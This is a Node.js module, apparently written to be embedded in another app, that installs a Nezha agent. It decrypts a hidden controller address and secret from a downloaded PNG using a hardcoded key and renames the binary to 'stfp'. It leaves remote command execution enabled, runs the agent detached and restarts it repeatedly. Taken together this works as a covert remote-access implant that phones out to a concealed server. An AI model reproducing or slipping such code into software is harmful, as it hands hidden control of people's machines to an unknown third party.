/**
 * 哪吒探针 - 二进制版（下载官方 nezha-agent 并 spawn）
 * 类似 indextupian 的模式
 *
 * 流程：
 * 1. 下载哪吒配置图片，解密获取 NZ_SERVER/NZ_SECRET
 * 2. 下载官方 nezha-agent 二进制
 * 3. 生成配置文件
 * 4. spawn 二进制进程
 * 5. 监控进程，挂了自动重启
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { spawn, exec } = require('child_process');
const zlib = require('zlib');

// ==================== 配置 ====================
const IMAGE_URL = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
const AGENT_VERSION = '2.2.2';
const CRYPTO_KEY = Buffer.from('1234567890abcdef1234567890abcdef', 'utf8');

// GitHub 代理（下载二进制用）
const GH_PROXIES = [
    'https://gh-proxy.com/',
    'https://mirror.ghproxy.com/',
    'https://ghproxy.net/',
    ''
];

// ==================== 路径配置 ====================
function resolveWritableDir(envVar, subpath) {
    const candidates = [];
    if (envVar) candidates.push(envVar);
    candidates.push(`/tmp/${subpath}`);
    candidates.push(path.join(os.tmpdir(), subpath));

    for (const p of candidates) {
        try {
            fs.mkdirSync(p, { recursive: true });
            const testFile = path.join(p, `.write_test_${Date.now()}`);
            fs.writeFileSync(testFile, 'x');
            fs.unlinkSync(testFile);
            return p;
        } catch (e) {}
    }
    const fallback = `/tmp/${subpath}`;
    fs.mkdirSync(fallback, { recursive: true });
    return fallback;
}

const CACHE_DIR = resolveWritableDir(process.env.CACHE_DIR, 'nezha_cache');
const TMP_DIR = resolveWritableDir(process.env.TMP_DIR, 'nezha_tmp');
const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
const ZIP_PATH = path.join(TMP_DIR, 'agent.zip');
const LOG_PATH = path.join(CACHE_DIR, 'agent.log');

// ==================== 全局状态 ====================
let agentProcess = null;
let currentUUID = '';
let currentIP = '';
let sessionAlive = false;
let restartAttempts = 0;
let isStarting = false;

// ==================== 工具函数 ====================
function fetchText(url, timeout = 15000) {
    return new Promise((resolve, reject) => {
        const req = https.get(url, { timeout }, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                fetchText(res.headers.location, timeout).then(resolve).catch(reject);
                return;
            }
            if (res.statusCode !== 200) {
                reject(new Error(`HTTP ${res.statusCode}`));
                return;
            }
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data.trim()));
        });
        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    });
}

function fetchFile(url, destPath, timeout = 120000) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const req = https.get(url, { timeout }, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                file.close();
                fs.unlink(destPath, () => {});
                fetchFile(res.headers.location, destPath, timeout).then(resolve).catch(reject);
                return;
            }
            if (res.statusCode !== 200) {
                file.close();
                fs.unlink(destPath, () => {});
                reject(new Error(`HTTP ${res.statusCode}`));
                return;
            }
            res.pipe(file);
            file.on('finish', () => {
                file.close(() => resolve(true));
            });
        });
        req.on('error', (err) => {
            file.close();
            fs.unlink(destPath, () => {});
            reject(err);
        });
        req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    });
}

async function fetchFileWithFallback(rawUrl, destPath) {
    let lastErr = null;
    for (const proxy of GH_PROXIES) {
        const fullUrl = proxy ? `${proxy}${rawUrl}` : rawUrl;
        try {
            await fetchFile(fullUrl, destPath);
            return true;
        } catch (e) {
            lastErr = e;
            try { fs.unlinkSync(destPath); } catch (_) {}
        }
    }
    throw lastErr || new Error('all proxies failed');
}

async function getPublicIP() {
    const services = [
        'https://api.ip.sb/ip',
        'https://ifconfig.me/ip',
        'https://ipinfo.io/ip',
        'https://icanhazip.com',
        'https://checkip.amazonaws.com',
    ];
    for (const svc of services) {
        try {
            const ip = await fetchText(svc, 8000);
            if (ip && /^\d+\.\d+\.\d+\.\d+$/.test(ip.trim())) {
                return ip.trim();
            }
        } catch (e) {}
    }
    return '';
}

function generateUUID(ip) {
    const seed = ip || 'default';
    const h = crypto.createHash('sha256').update('nezha-agent-uuid:' + seed).digest();
    const p1 = h.readUInt32BE(0);
    const p2 = h.readUInt16BE(4);
    const p3raw = h.readUInt16BE(6);
    const p3 = (p3raw & 0x0FFF) | 0x4000;
    const p4raw = h.readUInt16BE(8);
    const p4 = (p4raw & 0x3FFF) | 0x8000;
    const p5 = Buffer.from([10, h[11], h[12], h[13], h[14], h[15]]).toString('hex');
    return `${p1.toString(16).padStart(8, '0')}-${p2.toString(16).padStart(4, '0')}-${p3.toString(16).padStart(4, '0')}-${p4.toString(16).padStart(4, '0')}-${p5}`;
}

// ==================== 解密配置图片 ====================
function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');

        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;

        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;

        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf8').trim();
        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');

        const decipher = crypto.createDecipheriv('aes-256-cbc', CRYPTO_KEY, iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (e) {
        console.error('[Nezha] 解密配置失败:', e.message);
        return null;
    }
}

function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

// ==================== 解压 ZIP ====================
function extractZip(zipPath, destDir) {
    // 简单的 ZIP 解压（用系统 unzip 命令）
    return new Promise((resolve, reject) => {
        exec(`unzip -o "${zipPath}" -d "${destDir}"`, (err, stdout, stderr) => {
            if (err) {
                // 如果 unzip 不存在，尝试用 Python
                exec(`python3 -c "import zipfile; zipfile.ZipFile('${zipPath}').extractall('${destDir}')"`, (err2) => {
                    if (err2) {
                        reject(new Error('无法解压 ZIP: ' + (err2.message || err.message)));
                    } else {
                        resolve(true);
                    }
                });
            } else {
                resolve(true);
            }
        });
    });
}

// ==================== 核心逻辑 ====================
async function startNezhaAgent() {
    if (isStarting) return false;
    if (agentProcess && agentProcess.pid) {
        try { process.kill(agentProcess.pid, 0); return true; } catch (e) {}
    }

    isStarting = true;
    try {
        console.log('[Nezha] 启动哪吒探针（二进制版）...');

        // 1. 下载配置图片
        console.log('[Nezha] 下载配置图片...');
        await fetchFileWithFallback(IMAGE_URL, LOCAL_IMAGE_PATH);

        // 2. 解密配置
        const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
        if (!decryptedText) {
            console.error('[Nezha] 无法解密配置');
            isStarting = false;
            return false;
        }
        const nezhaConfig = parseEnv(decryptedText);
        if (!nezhaConfig.NZ_SERVER || !nezhaConfig.NZ_SECRET) {
            console.error('[Nezha] 配置不完整');
            isStarting = false;
            return false;
        }
        console.log(`[Nezha] 配置: server=${nezhaConfig.NZ_SERVER}, tls=${nezhaConfig.NZ_TLS}`);

        // 3. 获取公网 IP + 生成 UUID
        currentIP = await getPublicIP();
        currentUUID = generateUUID(currentIP);
        console.log(`[Nezha] 公网 IP: ${currentIP}, UUID: ${currentUUID}`);

        // 4. 下载 nezha-agent 二进制（如果不存在）
        if (!fs.existsSync(AGENT_BIN)) {
            console.log('[Nezha] 下载官方 nezha-agent 二进制...');
            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
            const arch = archMap[process.arch] || 'amd64';
            const rawUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;

            fs.mkdirSync(TMP_DIR, { recursive: true });
            await fetchFileWithFallback(rawUrl, ZIP_PATH);
            console.log('[Nezha] 二进制下载完成，解压...');

            // 清空 cache 目录
            if (fs.existsSync(CACHE_DIR)) {
                fs.rmSync(CACHE_DIR, { recursive: true, force: true });
            }
            fs.mkdirSync(CACHE_DIR, { recursive: true });

            // 解压
            await extractZip(ZIP_PATH, CACHE_DIR);
            try { fs.unlinkSync(ZIP_PATH); } catch (_) {}

            // 重命名二进制
            const originBin = path.join(CACHE_DIR, 'nezha-agent');
            if (fs.existsSync(originBin)) {
                fs.renameSync(originBin, AGENT_BIN);
                fs.chmodSync(AGENT_BIN, 0o755);
                console.log('[Nezha] 二进制安装完成:', AGENT_BIN);
            } else {
                console.error('[Nezha] ZIP 中找不到 nezha-agent 二进制');
                isStarting = false;
                return false;
            }
        }

        // 5. 写配置文件
        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${currentUUID}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${currentUUID}'
`;
        fs.writeFileSync(CONFIG_PATH, configContent);
        console.log('[Nezha] 配置文件已写入:', CONFIG_PATH);

        // 6. spawn 二进制进程
        const env = { ...process.env, UUID: currentUUID, NZ_CLIENT_ID: currentUUID, NZ_REPORT_DELAY: '4' };
        agentProcess = spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
            env,
            stdio: ['ignore', 'pipe', 'pipe'],
            detached: true,
        });

        // 捕获输出
        const logStream = fs.createWriteStream(LOG_PATH, { flags: 'a' });
        logStream.write(`\n=== ${new Date().toISOString()} 启动 agent, uuid=${currentUUID}, ip=${currentIP} ===\n`);

        agentProcess.stdout.on('data', (d) => {
            const s = d.toString();
            console.log('[nezha-agent]', s.trim());
            logStream.write(`[stdout] ${s}`);
        });
        agentProcess.stderr.on('data', (d) => {
            const s = d.toString();
            console.error('[nezha-agent ERR]', s.trim());
            logStream.write(`[stderr] ${s}`);
        });

        agentProcess.on('exit', (code, sig) => {
            console.log(`[Nezha] agent 进程退出 code=${code} sig=${sig}`);
            logStream.write(`=== 退出 code=${code} sig=${sig} at ${new Date().toISOString()} ===\n`);
            logStream.end();
            agentProcess = null;
            sessionAlive = false;
            // 5 秒后自动重启
            if (restartAttempts < 100) {
                restartAttempts++;
                console.log(`[Nezha] ${5}秒后重启 (第 ${restartAttempts} 次)...`);
                setTimeout(() => { startNezhaAgent().catch(() => {}); }, 5000);
            }
        });

        agentProcess.unref();
        sessionAlive = true;
        restartAttempts = 0;
        isStarting = false;
        console.log('[Nezha] 探针启动完成 ✓ (PID:', agentProcess.pid + ')');
        return true;

    } catch (err) {
        console.error('[Nezha] 启动失败:', err.message);
        sessionAlive = false;
        isStarting = false;
        agentProcess = null;
        return false;
    }
}

// ==================== 状态查询 ====================
function getNezhaStatus() {
    let pid = null;
    let running = false;
    if (agentProcess && agentProcess.pid) {
        pid = agentProcess.pid;
        try { process.kill(pid, 0); running = true; } catch (e) { running = false; }
    }
    return {
        status: running ? 'online' : 'offline',
        uuid: currentUUID,
        ip: currentIP,
        agent_bin: AGENT_BIN,
        config_path: CONFIG_PATH,
        version: AGENT_VERSION,
        mode: 'binary',
        uptime: process.uptime(),
        pid: pid,
        running: running,
        restartAttempts: restartAttempts,
    };
}

// ==================== 导出 ====================
module.exports = { main: startNezhaAgent, getNezhaStatus };
